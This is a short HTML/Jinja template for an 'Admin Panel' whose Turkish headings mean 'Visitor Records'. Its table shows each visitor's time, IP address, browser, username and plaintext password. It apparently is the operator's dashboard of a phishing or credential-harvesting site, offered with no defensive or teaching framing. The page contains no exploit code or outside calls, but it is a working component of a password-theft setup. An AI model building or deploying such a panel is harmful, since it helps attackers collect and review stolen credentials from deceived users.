<!DOCTYPE html>
<html>
<head>
  <title>Admin Panel</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-light">
  <div class="container mt-5">
    <h2 class="mb-4">Ziyaretçi Kayıtları</h2>
    <table class="table table-bordered table-striped">
      <thead>
        <tr>
          <th>Zaman</th>
          <th>IP</th>
          <th>Tarayıcı</th>
          <th>Kullanıcı Adı</th>
          <th>Şifre</th>
        </tr>
      </thead>
      <tbody>
        {% for visitor in visitors %}
        <tr>
          <td>{{ visitor.timestamp }}</td>
          <td>{{ visitor.ip }}</td>
          <td>{{ visitor.user_agent }}</td>
          <td>{{ visitor.username or "Yok" }}</td>
          <td>{{ visitor.password or "Yok" }}</td>
        </tr>
        {% endfor %}
      </tbody>
    </table>
  </div>
</body>
</html>
